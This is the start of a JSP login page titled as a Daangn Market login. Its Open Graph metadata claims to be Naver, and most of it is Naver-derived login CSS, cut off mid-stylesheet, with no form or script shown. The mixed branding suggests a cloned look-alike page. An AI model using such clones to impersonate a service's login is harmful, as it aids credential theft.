<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="네이버">
    <meta property="og:description" content="네이버에 로그인 하고 나를 위한 다양한 서비스를 이용해 보세요">
    <meta property="og:image" content="https://ssl.pstatic.net/static/nid/account/naver_og_image.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <title>당근마켓 :: 로그인</title>
    <style type="text/css">
    
    /*2022-1-14 5:14:22 PM*/
@charset "UTF-8";body,button,dd,dl,dt,fieldset,form,h1,h2,h3,h4,h5,h6,input,legend,li,ol,p,select,table,td,textarea,th,ul {
    margin: 0;
    padding: 0;
    -webkit-text-size-adjust: none;
    font-family: -apple-system,BlinkMacSystemFont,helvetica,"Apple SD Gothic Neo",sans-serif
}

html {
    height: 100%;
    font-size: 14px
}

button,input,select,textarea {
    border-radius: 0;
    border: none;
    background: 0 0;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    outline: 0;
    text-decoration: none;
    cursor: pointer;
    -webkit-text-size-adjust: none
}

button {
    cursor: pointer
}

label {
    cursor: pointer
}

fieldset,img {
    border: 0
}

ol,ul {
    list-style: none
}

address,em {
    font-style: normal
}

a {
    text-decoration: none;
    cursor: pointer
}

table {
    border-collapse: collapse;
    border-spacing: 0;
    -webkit-text-size-adjust: none
}

.u_skip {
    position: absolute;
    clip: rect(0 0 0 0);
    width: 1px;
    height: 1px;
    margin: -1px;
    overflow: hidden
}

.u_skip::before {
    display: block;
    width: 0;
    height: 0;
    content: '\00a0';
    font-size: 0
}

.footer .footer_copy .footer_logo,.header .logo,.reconfirm_top .logo {
    background-image: url(../img/DaangnMarket_logo.png);
    background-size: 244px 107px;
    background-repeat: no-repeat
}

.bullet_help,.captcha_form .image::after,.captcha_form .reload::after,.captcha_form .voice::after,.captcha_wrap .voice_box .icon_voice,.chatbot .icon_chatbot,.icon_delete,.id_pw_wrap .input_row .icon_cell .icon_id,.id_pw_wrap .input_row .icon_cell .icon_pw,.id_pw_wrap .input_row.on .icon_cell .icon_id,.id_pw_wrap .input_row.on .icon_cell .icon_pw,.img_lock,.img_wowpoint,.ip_relogin_box .relogin_close::after,.ip_relogin_box .relogin_tip::before,.keep_check .keep_text::before,.keep_check input:checked+.keep_text::before,.lang::after,.menu_id .menu_text::before,.menu_id.on .menu_text::before,.menu_id.on::after,.menu_ones .menu_text::before,.menu_ones.on .menu_text::before,.menu_ones.on::after,.menu_ones.on::before,.menu_qr .menu_text::before,.menu_qr.on .menu_text::before,.menu_qr.on::before,.nudge_banner .nudge_close .icon_nudge_close,.ones_text .bullet_set,.pop_img_lock,.qrcode_help_stepbox .popup_close::after,.qrcode_help_stepbox .step_title::before,.reconfirm_sub .captcha_form .image::after,.reconfirm_sub .captcha_form .reload::after,.reconfirm_sub .captcha_form .voice::after,.reconfirm_sub .captcha_wrap .voice_box .icon_voice,.sns_wrap li:nth-child(1) .sns_text::before,.sns_wrap li:nth-child(2) .sns_text::before,.sns_wrap li:nth-child(3) .sns_text::before,.step_ask .ask_text::before,.sub_desc .bullet_greendot,.sub_desc .bullet_lens,.time_wrap .btn_renewal::before {
    background-image: url(https://ssl.pstatic.net/static/nid/login/m_sp_01_login_008d5216.png);
    background-size: 266px 225px;
    background-repeat: no-repeat
}

body {
    height: 100%;
    color: #222;
    background-color: #fff
}

h1,h2,h3,h4,h5,h6 {
    font-weight: 400
}

.blind {
    position: absolute;
    clip: rect(0 0 0 0);
    width: 1px;
    height: 1px;
    margin: -1px;
    overflow: hidden
}

.wrap {
    position: relative;
    height: 100%;
    letter-spacing: -.5px
}

.header {
    padding-bottom: 48px;
    box-sizing: border-box
}

.header .header_inner {
    position: relative;
    width: 743px;
    margin: 0 auto;
    text-align: center;
    box-sizing: border-box
}

.header .logo {
    display: inline-block;
    margin-top: 108px;
    vertical-align: top;
    background-position: 0 -51px;
    background-repeat: no-repeat;
    width: 155px;
    height: 30px
}

.lang {
    position: absolute;
    top: 20px;
    right: 0
}

.lang::after {
    content: '';
    position: absolute;
    top: 8px;
    right: 8px;
    background-position: -147px -203px;
    background-repeat: no-repeat;
    width: 16px;
    height: 14px;
    z-index: 0
}

.sel {
    position: relative;
    font-size: 12px;
    font-weight: 400;
    line-height: 18px;
    width: 100%;
    min-width: 95px;
    height: 30px;
    padding: 4px 10px 6px 8px;
    padding: 7px 8px 6px 7px\9;
    color: #333;
    border: 1px solid #ccc;
    border-radius: 0;
    -webkit-appearance: none;
    cursor: pointer;
    z-index: 1
}

.footer {
    padding: 63px 0 32px;
    box-sizing: border-box
}

.footer .footer_inner {
    position: relative;
    text-align: center
}

.footer .corp,.footer .text {
    font-size: 12px;
    line-height: 15px;
    letter-spacing: -.5px;
    color: #888
}

.footer .footer_link li {
    display: inline-block
}

.footer .footer_link li+li {
    position: relative;
    padding-left: 13px
}

.footer .footer_link li+li::before {
    content: '';
    position: absolute;
    top: 4px;
    left: 4px;
    width: 1px;
    height: 11px;
    background-color: #dadada
}

.footer .footer_link+.footer_copy {
    margin-top: 9px
}

.footer .footer_copy .corp,.footer .footer_copy .text {
    line-height: 16px;
    font-family: 'Helvetica Neue',sans-serif
}

.footer .footer_copy .corp {
    padding: 0 2px;
    font-weight: 500;
    color: #000
}

.footer .footer_copy .footer_logo {
    display: inline-block;
    vertical-align: top;
    background-position: -157px -51px;
    background-repeat: no-repeat;
    width: 70px;
    height: 15px
}

@media (max-width: 742px) {
    .header .header_inner {
        width:auto;
        margin: 0 40px
    }

    .footer {
        margin: 0 40px
    }
}

.dimmed {
    position: fixed;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    background-color: rgba(0,0,0,.4);
    z-index: 200
}

.popup_layer {
    display: table;
    table-layout: fixed;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    text-align: center;
    z-index: 210
}

.popup_layer_inner {
    display: table-cell;
    vertical-align: middle
}

.popup_content {
    margin: 45px 0;
    vertical-align: top;
    z-index: 220
}

.login_wrap {
    box-sizing: border-box;
    width: 460px;
    margin: 0 auto
}

.menu_wrap {
    display: table;
    table-layout: fixed;
    width: 100%;
    border-collapse: collapse
}

.menu_item {
    position: relative;
    display: table-cell;
    vertical-align: top
}

.menu_id,.menu_ones,.menu_qr {
    display: block;
    position: relative;
    height: 61px;
    padding-top: 17px;
    border: 1px solid #e3e3e3;
    border-bottom: 0;
    border-radius: 6px 6px 0 0;
    background-color: #f8f9fa;
    text-align: center;
    box-sizing: border-box;
    z-index: 2
}

.menu_id .menu_text,.menu_ones .menu_text,.menu_qr .menu_text {
    position: relative;
    padding-left: 24px;
    font-size: 16px;
    font-weight: 500;
    line-height: 20px;
    letter-spacing: -.5px;
    color: #777;
    vertical-align: middle
}

.menu_id .menu_text::before,.menu_ones .menu_text::before,.menu_qr .menu_text::before {
    content: '';
    position: absolute;
    top: 1px;
    left: 0
}

.menu_id.on,.menu_ones.on,.menu_qr.on {
    border-color: #c6c6c6;
    background-color: #fff;
    z-index: 5
}

.menu_id.on .menu_text,.menu_ones.on .menu_text,.menu_qr.on .menu_text {
    color: #333
}

.menu_id {
    border-right: 0;
    border-radius: 6px 0 0 0
}

.menu_id .menu_text::before {
    background-position: -194px -139px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.menu_id.on::after {
    content: '';
    position: absolute;
    top: -1px;
    right: -8px;
    background-position: 0 -139px;
    background-repeat: no-repeat;
    width: 15px;
    height: 62px
}

.menu_id.on .menu_text::before {
    background-position: ;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.menu_ones {
    border-right: 0;
    border-radius: 0
}

.menu_ones .menu_text::before {
    background-position: -160px -172px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.menu_ones.on::before {
    content: '';
    position: absolute;
    top: -1px;
    left: -8px;
    background-position: -17px -139px;
    background-repeat: no-repeat;
    width: 15px;
    height: 62px
}

.menu_ones.on::after {
    content: '';
    position: absolute;
    top: -1px;
    right: -8px;
    background-position: 0 -139px;
    background-repeat: no-repeat;
    width: 15px;
    height: 62px
}

.menu_ones.on .menu_text::before {
    background-position: -178px -172px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.menu_qr {
    border-radius: 0 6px 0 0
}

.menu_qr .menu_text::before {
    background-position: -124px -172px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.menu_qr.on::before {
    content: '';
    position: absolute;
    top: -1px;
    left: -8px;
    background-position: -17px -139px;
    background-repeat: no-repeat;
    width: 15px;
    height: 62px
}

.menu_qr.on .menu_text::before {
    background-position: -105px -172px;
    background-repeat: no-repeat;
    width: 17px;
    height: 16px
}

.panel_wrap {
    position: relative;
    z-index: 3;
    margin-top: -8px
}

.panel_item {
    border: 1px solid #c6c6c6;
    border-radius: 6px;
    background-color: #fff;
    box-shadow: 0 5px 8px 0 rgba(68,68,68,.04)
}

.panel_inner {
    padding: 20px 28px
}

::-webkit-input-placeholder {
    color: #b1b1b1
}

input[type=text]::-webkit-input-placeholder {
    color: #b1b1b1
}

.input_row {
    position: relative;
    display: block;
    height: 100%;
    border: 1px solid #dadada;
    padding: 16px 18px 15px;
    border-radius: 6px;
    box-sizing: border-box;
    text-align: left;
    box-shadow: 0 2px 6px 0 rgba(68,68,68,.08)
}

.input_row .icon_id {
    position: absolute
}

.input_row+.input_row {
    margin-top: -1px
}

.input_row.focus {
    border: solid 1px #fe7f41;
    z-index: 5
}

.input_row.readonly {
    border: 1px solid #dadada
}

.input_row.readonly .btn_delete {
    display: none
}

.input_row.onetime {
    padding: 12px 17px
}

.input_row.onetime .input_text {
    font-size: 22px;
    line-height: 26px;
    text-align: center
}

.input_row.onetime input[type=text]::-webkit-input-placeholder {
    position: relative;
    top: -2px;
    font-size: 16px;
    color: #b1b1b1
}

.input_text {
    position: relative;
    display: block;
    width: 100%;
    font-size: 16px;
    font-weight: 400;
    line-height: 19px;
    letter-spacing: -.5px;
    color: #222;
    box-sizing: border-box;
    z-index: 4
}

.btn_delete {
    position: absolute;
    top: 6px;
    right: 8px;
    width: 35px;
    height: 35px;
    z-index: 5;
    background-color: #fff
}

.icon_delete {
    display: inline-block;
    margin: 8px 0 0 8px;
    background-position: -244px -187px;
    background-repeat: no-repeat;
    width: 18px;
    height: 18px
}

.top_message_wrap {
    margin-top: -26px;
    padding-bottom: 23px;
    text-align: center;
    box-sizing: border-box
}

.top_message_wrap .message_text {
    color: #666
}

.message_wrap {
    min-height: 48px;
    padding: 17px 0 32px;
    text-align: center;
    box-sizing: border-box
}

.message_text {
    display: inline-block;
    font-size: 17px;
    font-weight: 500;
    line-height: 24px;
    color: #777;
    vertical-align: middle
}

.message_text .accent {
    color: #fe7f41;
    font-weight: 700
}

.id_pw_wrap .input_row {
    display: table;
    table-layout: fixed;
    width: 100%;
    padding: 14px 17px 13px;
    box-sizing: border-box
}

.id_pw_wrap .input_row.on .icon_cell .icon_id {
    background-position: -75px -203px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.id_pw_wrap .input_row.on .icon_cell .icon_pw {
    background-position: -111px -203px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.id_pw_wrap .input_row .icon_cell {
    display: table-cell;
    width: 24px;
    vertical-align: middle
}

.id_pw_wrap .input_row .icon_cell .icon_id,.id_pw_wrap .input_row .icon_cell .icon_pw {
    position: absolute;
    top: 50%;
    left: 17px;
    margin-top: -8px;
    background-position: -93px -203px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.id_pw_wrap .input_row .icon_cell .icon_pw {
    background-position: -129px -203px;
    background-repeat: no-repeat;
    width: 16px;
    height: 16px
}

.id_pw_wrap .input_row .input_text {
    display: table-cell;
    padding-right: 30px
}

.id_pw_wrap .input_row:first-child {
    border-radius: 6px 6px 0 0;
    box-shadow: none
}

.id_pw_wrap .input_row:last-child {
    border-radius: 0 0 6px 6px
}

.captcha_wrap {
    margin-top: 10px;
    padding: 13px;
    border-radius: 6px;
    box-shadow: 0 3px 6px 0 rgba(68,68,68,.04);
    border: solid 1px #dadada;
    background-color: #fff;
    text-align: center
}

.captcha_wrap .captcha_img_cover {
    position: relative;
    max-height: 174px;
    border-radius: 6px
}

.captcha_wrap .captcha_img_cover::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    border: solid 1px rgba(0,0,0,.1);
    border-radius: 6px
}

.captcha_wrap .captcha_img {
    display: block;
    max-height: 174px;
    border-radius: 6px;
    box-sizing: border-box
}

.captcha_wrap .captcha_desc {
    padding-top: 8px;
    font-size: 12px;
    line-height: 17px;
    letter-spacing: -.5px;
    color: #ababab
}

.captcha_wrap .captcha_message {
    padding-top: 5px;
    font-size: 14px;
    font-weight: 600;
    line-height: 23px;
    letter-spacing: -.5px;
    color: #fe7f41
}

.captcha_wrap .voice_box {
    width: 100%;
    padding: 43px 0 42px;
    border-radius: 6px;
    border: solid 1px rgba(0,0,0,.04);
    background-color: #f2f2f2;
    box-sizing: border-box
}

.captcha_wrap .voice_box .icon_voice {
    display: inline-block;
    vertical-align: top;
    background-position: -146px 0;
    background-repeat: no-repeat;
    width: 64px;
    height: 50px
}

.captcha_wrap .voice_box .voice_text {
    padding-top: 14px;
    font-size: 16px;
    font-weight: 500;
    line-height: 23px;
    letter-spacing: -.5px;
    color: #fe7f41
}

.captcha_form {
    position: relative;
    margin-top: 11px;
    padding-right: 89px;
    box-sizing: border-box
}

.captcha_form .input_row {
    padding: 10px 14px 9px
}

.captcha_form .input_text {
    font-size: 12px;
    letter-spacing: -.38px
}

.captcha_form .captcha_btn {
    position: absolute;
    top: 0;
    right: 0
}

.captcha_form .captcha_btn::after {
    content: " ";
    display: block;
    clear: both
}

.captcha_form .image,.captcha_form .reload,.captcha_form .voice,.reconfirm_sub .captcha_form .image,.reconfirm_sub .captcha_form .voice {
    overflow: hidden;
    float: left;
    width: 40px;
    height: 40px;
    padding-top: 3px;
    border-radius: 6px;
    box-shadow: 0 3px 6px 0 rgba(68,68,68,.04);
    border: solid 1px #dadada;
    background-color: #fff;
    box-sizing: border-box;
    vertical-align: top
}

.captcha_form .image::after,.captcha_form .reload::after,.captcha_form .voice::after,.reconfirm_sub .captcha_form .image::after,.reconfirm_sub .captcha_form .voice::after {
    content: '';
    display: inline-block;
    background-position: -212px -172px;
    background-repeat: no-repeat;
    width: 24px;
    height: 24px
}

.captcha_form .image+.image,.captcha_form .image+.voice,.captcha_form .reload+.image,.captcha_form .reload+.voice,.captcha_form .voice+.image,.captcha_form .voice+.voice,.reconfirm_sub .captcha_form .image+.image,.reconfirm_sub .captcha_form .image+.voice,.reconfirm_sub .captcha_form .voice+.image,.reconfirm_sub .captcha_form .voice+.voice {
    margin-left: 5px
}

.captcha_form .voice::after {
    margin-left: 5px;
    background-position: -212px -120px;
    background-repeat: no-repeat;
    width: 24px;
    height: 24px
}

.captcha_form .image::after {
    background-position: -212px -146px;
    background-repeat: no-repeat;
    width: 24px;
    height: 24px
}

.login_keep_wrap {
    position: relative;
    margin-top: 13px;
    padding-right: 90px
}

.keep_check {
    position: relative;
    padding-left: 23px
}

.keep_check .input_keep {
    position: absolute;
    top: 2px;
    left: 3px;
    width: 15px;
    height: 15px
}

.keep_check .keep_text {
    display: inline-block;
    font-size: 14px;
    font-weight: 500;
    line-height: 17px;
    color: #777
}

.keep_check .keep_text::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    background-position: -244px -87px;
    background-repeat: no-repeat;
    width: 18px;
    height: 18px;
    background-color: #fff
}

.keep_check input:checked+.keep_text::before {
    background-position: -244px -167px;
    background-repeat: no-repeat;
    width: 18px;
    height: 18px
}

.ip_check {
    position: absolute;
    top: 0;
    right: 0;
    padding-right: 38px
}

.ip_check .ip_text {
    font-size: 14px;
    font-weight: 500;
    line-height: 17px;
    letter-spacing: -.41px;
    color: #777
}

.ip_check .switch {
    position: absolute;
    top: 50%;
    right: 0;
    margin-top: -9px;
    text-align: center;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent
}

.ip_check .switch_checkbox {
    position: absolute;
    top: 5px;
    right: 5px
}

.ip_check .switch_btn {
    display: block;
    position: relative;
    width: 33px;
    height: 18px;
    margin: 0 auto;
    border-radius: 12px;
    background-color: #c3c8c9;
    box-sizing: border-box
}

.ip_check .switch_btn::before {
    content: '';
    display: block;
    position: absolute;
    top: 50%;
    left: 2px;
    width: 14px;
    height: 14px;
    margin-top: -7px;
    border-radius: 50%;
    background-color: #fff;
    box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
    transition: all .1s ease;
    box-sizing: border-box
}

.ip_check .switch_checkbox:checked+.switch_btn {
    background-color: #fe7f41;
    transition: all .2s ease
}

.ip_check .switch_checkbox:checked+.switch_btn::before {
    transform: translate(15px,0);
    background-color: #fff
}

.error_message {
    display: inline-block;
    font-size: 12px;
    line-height: 16px;
    letter-spacing: -.5px;
    color: #ff003e;
    vertical-align: middle
}

.login_error_wrap {
    position: relative;
    min-height: 34px;
    margin: 24px 0 -22px;
    padding-right: 40px
}

.login_error_wrap::before {
    content: '';
    display: inline-block;
    width: 0;
    height: 34px;
    line-height: 34px;
    vertical-align: middle
}

.login_error_wrap.global {
    padding-right: 0
}

.login_error_wrap.global::before {
    display: none
}

.chatbot {
    position: absolute;
    top: 0;
    right: 0;
    width: 34px;
    height: 34px;
    border-radius: 5px;
    border: solid 1px #dadada;
    background-color: #fff;
    text-align: center;
    box-sizing: border-box
}

.chatbot .icon_chatbot {
    display: inline-block;
    margin-top: 5px;
    background-position: -181px -104px;
    background-repeat: no-repeat;
    width: 24px;
    height: 24px
}

.img_lock,.pop_img_lock {
    display: block;
    margin: 41px auto 17px;
    background-position: -76px 0;
    background-repeat: no-repeat;
    width: 68px;
    height: 68px
}

.pop_img_lock {
    margin: 7px auto 18px
}

.ones_text {
    padding: 21px 0 38px;
    font-size: 15px;
    line-height: 21px;
    letter-spacing: -.6px;
    color: #1e1e23;
    text-align: center;
    vertical-align: top
}

.ones_text .bullet_set {
    display: inline-block;
    margin-top: 2px;
    vertical-align: top;
    background-position: -86px -172px;
    background-repeat: no-repeat;
    width: 17px;
    height: 16px
}

.ones_text .accent {
    font-weight: 500;
    color: #fe7f41
}

.top_desc {
    padding: 5px 0 4px;
    font-size: 14px;
    font-weight: 500;
    line-height: 18px;
    letter-spacing: -.35px;
    color: #1e1e23;
    text-align: center
}

.sub_desc {
    padding-bottom: 13px;
    font-size: 12px;
    line-height: 18px;
    color: #666;
    text-align: center
}

.sub_desc .bullet_greendot,.sub_desc .bullet_lens {
    display: inline-block;
    margin-top: 3px;
    vertical-align: top;
    background-position: -198px -65px;
    background-repeat: no-repeat;
    width: 11px;
    height: 11px
}

.sub_desc .bullet_lens {
    background-position: -198px -78px;
    background-repeat: no-repeat;
    width: 11px;
    height: 11px
}

.sub_desc .point {
    display: inline-block;
    width: 27px;
    height: 16px;
    margin: 0 1px;
    line-height: 14px;
    padding: 1px 6px;
    border-radius: 10px;
    background-color: #000;
    color: #fff;
    box-sizing: border-box
}

.bullet_help {
    display: inline-block;
    margin-top: 3px;
    vertical-align: top;
    background-position: -198px -52px;
    background-repeat: no-repeat;
    width: 11px;
    height: 11px
}

.qrcode_map {
    display: block;
    padding: 16px 0 23px;
    text-align: center
}

.qrcode_map .qrcode_inner {
    position: relative;
    display: inline-block
}

.qrcode_map .qr_img {
    display: inline-block;
    vertical-align: top
}

.time_wrap {
    position: absolute;
    left: 112px;
    bottom: 0;
    min-width: 85px;
    text-align: left
}

.time_wrap .time_text {
    padding-bottom: 1px;
    font-size: 13px;
    line-height: 20px;
    font-weight: 600;
    color: #555
}

.time_wrap .time_num {
    position: relative;
    display: inline-block;
    font-size: 16px;
    font-weight: 700;
    letter-spacing: -.3px;
    color: #fe7f41
}

.time_wrap .btn_renewal {
    position: relative;
    padding-left: 26px;
    font-size: 15px;
    line-height: 19px;
    font-weight: 600;
    color: #fe7f41
}

.time_wrap .btn_renewal::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 0;
    margin-top: -10px;
    background-position: -244px -25px;
    background-repeat: no-repeat;
    width: 21px;
    height: 20px
}

.qrcode_valid {
    padding: 40px 0 43px;
    box-sizing: border-box
}

.qrcode_valid .sub_desc {
    padding: 13px 0 12px;
    font-size: 13px;
    line-height: 19px;
    color: #8e8e8e
}

.qrcode_valid .time_wrap {
    position: inherit;
    text-align: center
}

.img_wowpoint {
    display: block;
    margin: 0 auto;
    vertical-align: top;
    background-position: -146px -52px;
    background-repeat: no-repeat;
    width: 50px;
    height: 50px
}

.popup_qrcode_help {
    padding: 50px;
    text-align: left
}

.qrcode_help_stepbox {
    position: relative;
    width: 978px;
    height: 760px;
    margin: 0 auto;
    padding: 34px 34px 50px 50px;
    border-radius: 12px;
    box-shadow: 0 6px 20px 0 rgba(0,0,0,.3);
    border: solid 1.5px rgba(0,0,0,.1);
    background-image: linear-gradient(to top,#2c537d,#2c4e76);
    box-sizing: border-box
}

.qrcode_help_stepbox .popup_close {
    position: absolute;
    top: 28px;
    right: 28px;
    width: 40px;
    height: 40px;
    z-index: 1
}

.qrcode_help_stepbox .popup_close::after {
    content: '';
    display: inline-block;
    background-position: -212px -63px;
    background-repeat: no-repeat;
    width: 29px;
    height: 29px
}

.qrcode_help_stepbox .step_title {
    position: relative;
    padding-top: 33px;
    padding-left: 108px;
    text-align: left
}

.qrcode_help_stepbox .step_title::before {
    content: '';
    position: absolute;
    top: 26px;
    left: 13px;
    background-position: 0 0;
    background-repeat: no-repeat;
    width: 74px;
    height: 74px
}

.qrcode_help_stepbox .step_title .step_title_img {
    vertical-align: top
}

.step_wrap {
    padding-top: 46px
}

.step_wrap .step_top {
    padding-left: 10px
}

.step_wrap .step_top::after {
    content: " ";
    display: block;
    clear: both
}

.step_wrap .step_top li {
    float: left
}

.step_wrap .step_top li+li {
    margin-left: 24px
}

.step_wrap .step_top img {
    display: block
}

.step_wrap .step_top+.step_desc li {
    margin-top: -33px
}

.step_wrap .step_desc {
    margin: -30px -44px 0
}

.step_ask {
    position: relative;
    top: -25px;
    margin-left: 15px
}

.step_ask .ask_text {
    display: inline-block;
    padding-left: 22px;
    font-size: 13px;
    color: #90b5db
}

.step_ask .ask_text::before {
    content: '';
    position: absolute;
    top: 2px;
    left: 0;
    background-position: -198px -52px;
    background-repeat: no-repeat;
    width: 11px;
    height: 11px
}

.step_ask .ask_link {
    padding-left: 5px
}

.step_ask .ask_link .text {
    font-size: 13px;
    font-weight: 600;
    color: #c9dffa
}

.popup_ip_relogin {
    padding: 50px 0;
    text-align: left
}

.ip_relogin_box {
    position: relative;
    margin: 0 auto;
    padding: 56px 0 0;
    border-radius: 16px;
    background-color: #fff;
    box-sizing: border-box
}

.ip_relogin_box .relogin_title {
    margin-left: 35px;
    font-size: 34px;
    line-height: 41px;
    color: #000
}

.ip_relogin_box .relogin_title .accent {
    color: #fe7f41
}

.ip_relogin_box .relogin_desc {
    margin-left: 35px;
    padding-top: 10px;
    font-size: 18px;
    font-weight: 500;
    line-height: 23px;
    color: #9d9fa6
}

.ip_relogin_box .relogin_tip {
    position: relative;
    margin-left: 35px;
    padding: 0 0 21px 41px;
    font-size: 15px;
    font-weight: 500;
    line-height: 23px;
    color: #a3a5aa
}

.ip_relogin_box .relogin_tip::before {
    content: '';
    position: absolute;
    top: 3px;
    left: 0;
    background-position: -34px -172px;
    background-repeat: no-repeat;
    width: 30px;
    height: 19px
}

.ip_relogin_box .relogin_close {
    position: absolute;
    top: 37px;
    right: 35px;
    width: 40px;
    height: 40px;
    text-align: center
}

.ip_relogin_box .relogin_close::after {
    content: '';
    display: inline-block;
    margin-top: 5px;
    background-position: -212px -32px;
    background-repeat: no-repeat;
    width: 29px;
    height: 29px
}

.pop_top_desc {
    margin-top: -2px;
    font-size: 17px;
    font-weight: 500;
    line-height: 25px;
    color: #49494c;
    text-align: center
}

.pop_qrcode_map {
    padding-top: 18px;
    text-align: center
}

.pop_qrcode_map .qr_img {
    padding: 10px;
    border: 1px solid #dadada
}

.pop_time_wrap {
    padding-top: 19px;
    text-align: center
}

.pop_time_wrap .time_text {
    padding-bottom: 1px;
    font-size: 1rem;
    font-weight: 600;
    letter-spacing: -.44px;
    color: #000
}

.pop_time_wrap .time_num {
    position: relative;
    display: inline-block;
    font-size: 20px;
    font-weight: 700;
    letter-spacing: -.42px;
    color: #fe7f41
}

.pw_reconfirm_box {
    position: relative;
    margin: 50px auto;
    background-color: #fff
}

.reconfirm_inner {
    padding: 20px 20px 40px;
    box-sizing: border-box
}

.reconfirm_top {
    position: relative;
    text-align: center
}

.reconfirm_top+.reconfirm_sub {
    padding-top: 20px
}

.reconfirm_top .logo {
    display: inline-block;
    margin-top: 62px;
    vertical-align: top;
    background-position: 0 -83px;
    background-repeat: no-repeat;
    width: 124px;
    height: 24px
}

.reconfirm_top .lang {
    top: 0
}

.reconfirm_top .title {
    display: block;
    padding-top: 31px;
    font-size: 17px;
    font-weight: 600;
    line-height: 24px;
    letter-spacing: -.5px;
    color: #000
}

.reconfirm_top .title .accent {
    font-weight: 700;
    color: #fe7f41
}

.reconfirm_top .desc {
    padding-top: 8px;
    font-size: 14px;
    font-weight: 500;
    line-height: 19px;
    letter-spacing: -.3px;
    color: #76808d
}

.reconfirm_sub {
    padding: 0 20px;
    text-align: left
}

.reconfirm_sub+.reconfirm_bottom {
    margin-top: 14px
}

.reconfirm_sub .error_reconfirm {
    margin-top: 12px;
    padding-bottom: 4px;
    font-size: 0
}

.reconfirm_sub .error_reconfirm .error_message {
    font-size: 12px
}

.reconfirm_sub .captcha_wrap {
    padding-top: 12px
}

.reconfirm_sub .captcha_wrap .captcha_img_cover {
    max-height: 194px
}

.reconfirm_sub .captcha_wrap .captcha_img {
    max-height: 194px
}

.reconfirm_sub .captcha_wrap .voice_box {
    padding: 53px 0 52px
}

.reconfirm_sub .captcha_wrap .voice_box .icon_voice {
    vertical-align: top;
    background-position: -69px -76px;
    background-repeat: no-repeat;
    width: 64px;
    height: 50px
}

.reconfirm_sub .captcha_wrap .voice_box .voice_text {
    padding-top: 14px;
    font-size: 16px;
    line-height: 23px
}

.reconfirm_sub .captcha_form {
    margin-top: 11px;
    padding-right: 116px
}

.reconfirm_sub .captcha_form .image,.reconfirm_sub .captcha_form .reload,.reconfirm_sub .captcha_form .voice {
    width: 52px;
    height: 52px
}

.reconfirm_sub .captcha_form .image::after,.reconfirm_sub .captcha_form .reload::after,.reconfirm_sub .captcha_form .voice::after {
    background-position: -162px -139px;
    background-repeat: no-repeat;
    width: 30px;
    height: 30px
}

.reconfirm_sub .captcha_form .image+.image,.reconfirm_sub .captcha_form .image+.voice,.reconfirm_sub .captcha_form .reload+.image,.reconfirm_sub .captcha_form .reload+.voice,.reconfirm_sub .captcha_form .voice+.image,.reconfirm_sub .captcha_form .voice+.voice {
    margin-left: 6px
}

.reconfirm_sub .captcha_form .voice::after {
    background-position: -34px -139px;
    background-repeat: no-repeat;
    width: 30px;
    height: 31px
}

.reconfirm_sub .captcha_form .image::after {
    background-position: -212px 0;
    background-repeat: no-repeat;
    width: 30px;
    height: 30px
}

.reconfirm_bottom .footer_copy .corp,.reconfirm_bottom .footer_copy .text {
    font-size: 12px;
    font-weight: 500;
    line-height: 15px;
    letter-spacing: -.43px;
    color: #888
}

.reconfirm_bottom .footer_copy .corp+.footer_help,.reconfirm_bottom .footer_copy .text+.footer_help {
    position: relative;
    padding-left: 13px
}

.reconfirm_bottom .footer_copy .corp+.footer_help::before,.reconfirm_bottom .footer_copy .text+.footer_help::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 5px;
    width: 1px;
    height: 12px;
    margin-top: -6px;
    border-radius: .5px;
    background-color: #dadada
}

.reconfirm_bottom .footer_copy .text {
    font-weight: 400
}

.btn_login_wrap {
    margin-top: 38px
}

.btn_ones_wrap {
    margin-top: 10px
}

.btn_login {
    display: block;
    width: 100%;
    padding: 13px 0 13px;
    border-radius: 6px;
    border: solid 1px rgba(0,0,0,.15);
    background-color: #fe7f41;
    box-sizing: border-box
}

.btn_login .btn_text {
    font-size: 20px;
    font-weight: 700;
    line-height: 24px;
    color: #fff
}

.btn_reconfirm_wrap {
    margin-top: 12px
}

.btn_reconfirm_wrap .btn_login {
    padding: 13px 0;
    border-radius: 5.4px
}

.btn_reconfirm_wrap .btn_login .btn_text {
    font-size: 20px;
    line-height: 24px;
    letter-spacing: -.5px
}

.find_wrap,.relogin_find_wrap {
    padding: 20px 0 35px;
    text-align: center
}

.find_wrap li,.relogin_find_wrap li {
    position: relative;
    display: inline-block
}

.find_wrap li+li,.relogin_find_wrap li+li {
    padding-left: 28px
}

.find_wrap li+li::before,.relogin_find_wrap li+li::before {
    content: '';
    position: absolute;
    top: 3px;
    left: 12px;
    width: 1px;
    height: 12px;
    border-radius: .5px;
    background-color: #dadada
}

.find_wrap .en_find_text,.find_wrap .find_text,.relogin_find_wrap .en_find_text,.relogin_find_wrap .find_text {
    display: inline-block;
    font-size: 14px;
    line-height: 17px;
    text-decoration: none;
    color: #888
}

.find_wrap .en_find_text,.relogin_find_wrap .en_find_text {
    text-decoration: underline
}

.sns_cover {
    display: block;
    width: 460px;
    margin: 0 auto;
    padding-bottom: 100px;
    box-sizing: border-box
}

.sns_wrap {
    display: table;
    table-layout: fixed;
    width: 100%
}

.sns_wrap li {
    display: table-cell;
    vertical-align: middle
}
